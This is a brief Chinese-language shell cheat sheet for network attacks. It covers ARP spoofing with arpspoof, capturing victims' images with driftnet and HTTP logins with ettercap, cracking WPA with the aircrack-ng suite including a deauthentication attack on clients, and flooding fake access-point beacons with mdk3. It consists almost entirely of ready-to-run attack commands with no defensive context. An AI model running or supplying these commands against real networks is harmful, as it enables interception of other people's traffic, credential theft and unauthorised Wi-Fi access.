### ARP欺骗

```shell
# 是否开启流量转发 0 不开启 1 开启
echo 1 > /proc/sys/net/ipv4/ip_forward
# arp欺骗
arpspoof -i 网卡 -t 目标ip 网关
# 抓取图片
driftnet -i 网卡
-a # 后台模式
-d # 图片保存路径
# 获取http请求账号密码
ettercap -Tq -i 网卡
```

### WPA破解


```shell
# 开启监听模式
airmon-ng start wlan0
# 抓包
airodump-ng -w 文件名 临时网卡名
airodump-ng -w 文件名 -c 信道 临时网卡名
# deauth攻击
aireplay-ng -0 10 -a 路由器mac -c 客户端mac 临时网卡名
# 破解密码
aircrack-ng -w 字典 文件名-*.cap
```

### 伪装AP

```shell
mdk3 临时网卡名 b -g -c 信道 -n AP名
```

